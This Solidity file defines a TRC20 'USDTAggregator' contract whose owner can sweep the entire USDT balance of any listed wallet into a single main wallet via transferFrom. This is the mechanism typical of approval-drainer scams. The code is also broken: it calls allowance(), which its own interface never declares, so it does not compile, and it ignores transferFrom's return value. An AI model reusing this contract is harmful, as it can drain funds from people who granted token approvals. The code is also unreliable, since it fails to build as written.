// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITRC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract USDTAggregator {
    address public mainWallet;
    address public owner;
    ITRC20 public usdtToken;

    constructor(address _usdtToken, address _mainWallet) {
        usdtToken = ITRC20(_usdtToken);
        mainWallet = _mainWallet;
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the contract owner");
        _;
    }

    function aggregateUSDT(address[] memory wallets) public onlyOwner {
        for (uint256 i = 0; i < wallets.length; i++) {
            uint256 balance = usdtToken.balanceOf(wallets[i]);
            if (balance > 0) {
                usdtToken.transferFrom(wallets[i], mainWallet, balance);
            }
        }
    }

    function checkAllowance(address wallet) public view returns (uint256) {
        return usdtToken.allowance(wallet, address(this));
    }
}
